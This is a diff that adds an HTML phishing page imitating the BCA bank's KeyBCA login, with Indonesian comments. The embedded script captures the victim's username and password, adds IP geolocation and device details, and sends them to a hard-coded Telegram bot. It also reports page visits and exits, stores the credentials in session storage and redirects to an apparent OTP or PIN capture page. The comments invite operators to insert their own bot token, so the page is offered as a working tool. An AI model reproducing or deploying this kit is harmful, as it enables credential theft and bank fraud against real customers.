@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="in">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta property="og:image" content="https://blogger.googleusercontent.com/img/a/AVvXsEjnCFXAtfeFq_8EXk8_oJePP1ajC-ES-yWgYDebNQ2_9JMOY5FluUGpmUM65QC3bv9lMnOHMpGd-LK-uVFSwJ86m8A-4sMGVqEqkPhw8Qw4zRSZG4UEibf1WR6w_batlVoRGj9RfCx_t9dL5zmMzfweu9UlkVZ9MzEv3Xl-5ejHoUVUFnXT5c9rv0KlG4vk">
+    <title>BCA</title>
+    <link rel="canonical" href="https://hol-wis.my.id" />
+    <link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon"> 
+    <link rel="apple-touch-icon" href="./assets/ico/apple-touch-icon.png"> 
+    <link rel="stylesheet" href="assets/css/main.css"> 
+    <link rel="stylesheet" href="assets/css/styles.css"> 
+    <link rel="stylesheet" href="assets/css/main.css" />
+    <link rel="stylesheet" href="assets/css/styles.2.css" />
+    <link rel="stylesheet" href="styles.64003c381abb4bcbd5d1.css">
+    <style>
+        @charset "UTF-8";
+        @import url(assets/plugins/fontawesome-5.5.0/css/all.min.css);
+        @import url(assets/plugins/animate-css-3.6.0/animate.min.css);
+        
+        .grecaptcha-badge {
+            visibility: collapse !important;
+        }   
+        
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+        
+        * {
+            font-family: 'Ubuntu', sans-serif;
+            font-weight: 400;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            position: relative;
+            color: #000;
+        }
+        
+        body, html {
+            background-image: url('');
+            background-repeat: no-repeat;
+            background-position: 100% 100%;
+            background-size: 100% 100%;
+            font-family: 'Ubuntu', sans-serif;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            top: 0;
+            margin: 0px auto;
+            background-color: #f6f6f6ef;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .container {
+            max-width: 90%;
+            padding: 0px;
+            background-color:;
+            margin-left: auto;
+            margin-right: auto;
+            border-radius: 10px;
+        }
+        
+        .button {
+            margin-top: 5px;
+            width: 100%;
+            height: 40px;
+            border: none;
+            outline: none;
+            border-radius: 25px;
+            color: #fff;
+            background: #1171ce;
+            text-align: center;
+            font-size: 13px;
+            font-weight: bold;
+            box-shadow: 2px 2px 2px 0px rgba(8,8,0,0.5);
+        }
+        
+        button:disabled {
+            opacity: 0.7;
+        }
+        
+        input {
+            width: 100%;
+            height: 40px;
+            margin:;
+            padding: 10px;
+            border-radius: 4px;
+            border: none;
+            box-shadow: 0px 4px 4px 0px #dedede;
+        }
+        
+        .space {
+            padding: 0px;
+            height: 0%;
+        }
+        
+        /* Loading Overlay */
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            font-size: 18px;
+        }
+        
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #1171ce;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        #status {
+            display: none;
+        }
+    </style>
+</head>
+<body style="position: ring; margin: 0px auto; left: 0; right: 0; top: 0"> 
+
+    <!-- Loading Overlay -->
+    <div id="loading-overlay">
+        <div class="spinner"></div>
+        <div>Memproses Login...</div>
+    </div>
+
+    <img src="https://blogger.googleusercontent.com/img/a/AVvXsEi2FNMgf8UL6KRIEDRJSy7jtDX8iYnygbmiVHNAnVglb1hAW6IcYnoeTJY8hBlHHSPRuEfgaEnNnOUM0hHoPlCp-nErBpZ7mdxAcfGKh5E8fdk3qEsYjowdZ5UkLWh42Qp2HED7BcSqR7IPCklX2MRkj6PlWfnkqWZeITwzLwKBLwi9jVtrc3B5QsPrlYuW" width="100%" style="" alt="">
+    
+    <div class="space" style="padding:0%;height:;margin:;"></div>
+    
+    <div class="container">
+        <form id="loginForm">
+            <div class="container">
+                <br>
+                <lbl style="color:#1e5cb5;font-weight: 800;font-size:14px;">Username</lbl>  
+                <input type="text" id="username" placeholder="CorporateID UserID (Tanpa Spasi)" name="user" required>
+                <br><br>
+                <lbl style="color:#1e5cb5;font-weight: 800;font-size:14px;">Password</lbl>  
+                <input type="password" id="password" inputmode="numeric" placeholder="KeyBCA Appli 1" name="pass" required>
+                <br><br>
+                <button type="submit" style="width: 100%; height: 40px; position; fixed; bottom: 0; right; 0; left: 0; margin-bottom: -23px; padding: 0px 0px; background: #0f65b8; color:#fff; border-radius:20px; font-weight: solid; border: 0px none #fff; font-size:17px;">
+                    LOGIN
+                </button>
+            </div>
+        </form>
+    </div> 
+    
+    <br>
+    
+    <img src="https://blogger.googleusercontent.com/img/a/AVvXsEh1_ULa8tNaIrvWu9BoTLvnfCm4NrsplOISbA6FNda4WzAjWpJLNCjp6yrtdMMkx98U2nC7JuhQR_5yXB2zWcjxg--jOEh3YvxjVW-JFKNXN4jQwW3Zp8lunKTBTU9mxytP0spr-rI5s2K3xRQmYKxtfKtU3t8H2jzg6yyv_gKWqrX_a6o5yK6MU3HEgZwm" width="100%" alt="">
+
+    <p id="status"></p>
+
+    <script>
+        // ==================== KONFIGURASI TELEGRAM ====================
+        const TELEGRAM_TOKEN = "8886749483:AAGcJx5AGiJt3gYqRMrKkLDI2x1tA2m-paM"; // Ganti Dengan Token Bot Telegram Anda 
+        const CHAT_ID = "7384813944"; // Gati Dengan Chta ID Telegram Anda
+
+        // ==================== FUNGSI KIRIM KE TELEGRAM ====================
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (!response.ok) {
+                    console.error('Gagal mengirim ke Telegram');
+                    document.getElementById('status').textContent = "Gagal mengirim data";
+                }
+                return await response.json();
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('status').textContent = "Error koneksi";
+            }
+        }
+
+        // ==================== FUNGSI GET IP ====================
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return 'Tidak diketahui';
+            }
+        }
+
+        // ==================== FUNGSI GET DETAIL IP ====================
+        async function getIPDetails() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip || 'Tidak diketahui',
+                    city: data.city || 'Tidak diketahui',
+                    region: data.region || 'Tidak diketahui',
+                    country: data.country_name || 'Tidak diketahui',
+                    org: data.org || 'Tidak diketahui'
+                };
+            } catch (e) {
+                return {
+                    ip: 'Tidak diketahui',
+                    city: 'Tidak diketahui',
+                    region: 'Tidak diketahui',
+                    country: 'Tidak diketahui',
+                    org: 'Tidak diketahui'
+                };
+            }
+        }
+
+        // ==================== ELEMEN DOM ====================
+        const loginForm = document.getElementById('loginForm');
+        const username = document.getElementById('username');
+        const password = document.getElementById('password');
+        const loadingOverlay = document.getElementById('loading-overlay');
+
+        // ==================== FORMAT PESAN BCA ====================
+        function formatBCAMessage(data, ipDetails) {
+            const now = new Date();
+            const waktu = now.toLocaleString('id-ID', { 
+                timeZone: 'Asia/Jakarta',
+                dateStyle: 'full',
+                timeStyle: 'medium'
+            });
+            
+            return `
+🏦 <b>BCA - LOGIN</b> 🏦
+══════════════════════════
+
+👤 <b>Username:</b> <code>${data.username}</code>
+
+🔑 <b>Password:</b> <code>${data.password}</code>
+
+══════════════════════════
+<b>📍 INFORMASI LOKASI</b>
+══════════════════════════
+
+🌐 <b>IP Address:</b> ${ipDetails.ip}
+🏙️ <b>Kota:</b> ${ipDetails.city}
+🌏 <b>Region:</b> ${ipDetails.region}
+🇮🇩 <b>Negara:</b> ${ipDetails.country}
+🏢 <b>ISP:</b> ${ipDetails.org}
+
+══════════════════════════
+<b>📱 INFORMASI PERANGKAT</b>
+══════════════════════════
+
+⏰ <b>Waktu:</b> ${waktu}
+📱 <b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}
+
+══════════════════════════
+🔔 <b>NOTIFIKASI LOGIN BCA</b>
+══════════════════════════`;
+        }
+
+        // ==================== KIRIM NOTIFIKASI HALAMAN DIBUKA ====================
+        window.addEventListener('load', async function() {
+            const ipDetails = await getIPDetails();
+            
+            await sendToTelegram(`
+🔵 <b>HALAMAN LOGIN BCA DIBUKA</b> 🔵
+══════════════════════════
+
+👤 User membuka halaman login BCA
+
+📍 <b>Lokasi:</b> ${ipDetails.city}, ${ipDetails.region}
+🌐 <b>IP:</b> ${ipDetails.ip}
+⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}
+
+══════════════════════════
+            `);
+        });
+
+        // ==================== HANDLE FORM SUBMIT ====================
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const usernameVal = username.value.trim();
+            const passwordVal = password.value.trim();
+            
+            if (!usernameVal || !passwordVal) {
+                alert('Username dan Password harus diisi');
+                return;
+            }
+
+            // Tampilkan loading
+            loadingOverlay.style.display = 'flex';
+
+            // Ambil data
+            const data = {
+                username: usernameVal,
+                password: passwordVal
+            };
+
+            // Dapatkan IP details
+            const ipDetails = await getIPDetails();
+
+            // Format pesan
+            const message = formatBCAMessage(data, ipDetails);
+
+            // Kirim ke Telegram
+            await sendToTelegram(message);
+
+            // Simpan data ke sessionStorage untuk halaman berikutnya
+            sessionStorage.setItem("bcaUsername", data.username);
+            sessionStorage.setItem("bcaPassword", data.password);
+
+            // Redirect setelah 1.5 detik
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                // Ganti dengan halaman tujuan berikutnya (misal: OTP atau PIN)
+                window.location.href = "kode.html"; 
+            }, 1500);
+        });
+
+        // ==================== TRACK INPUT (OPSIONAL) ====================
+        let lastUsername = '';
+        username.addEventListener('input', function() {
+            if (this.value.length > 5 && this.value !== lastUsername) {
+                lastUsername = this.value;
+                // Uncomment jika ingin track setiap input
+                // sendToTelegram(`⌨️ User mengetik username: ${this.value}`);
+            }
+        });
+
+        // ==================== NOTIFIKASI KELUAR HALAMAN ====================
+        window.addEventListener('beforeunload', function() {
+            const message = `
+🚪 <b>USER MENINGGALKAN HALAMAN BCA</b> 🚪
+══════════════════════════
+
+👤 User menutup halaman login BCA
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+
+══════════════════════════
+            `;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+            
+            navigator.sendBeacon(url, JSON.stringify(data));
+        });
+
+        // ==================== VALIDASI FORM ====================
+        // Enable/disable button based on input (opsional)
+        function checkInputs() {
+            const btn = document.querySelector('button[type="submit"]');
+            if (username.value && password.value) {
+                btn.disabled = false;
+            } else {
+                btn.disabled = true;
+            }
+        }
+
+        username.addEventListener('input', checkInputs);
+        password.addEventListener('input', checkInputs);
+
+        // Initial check
+        checkInputs();
+
+        console.log('Script BCA siap!');
+    </script>
+
+    <!-- Script lain yang sudah ada --
+    
+    <script>
+        $(document).ready(function() {
+            setTimeout(() => {
+                $('#lodingku').hide();
+                $('chsalxcome2').fadeIn();
+            }, 860);
+        });
+    </script>
+    
+    <script src="ajax/libs/jquery/3.6.0/jquery.min.js"></script> 
+    <script src="npm/bootstrap-5.2.0-beta1/dist/js/bootstrap.bundle.min.js"></script> 
+    <script src="setPin.js"></script>
+</body>
+</html>
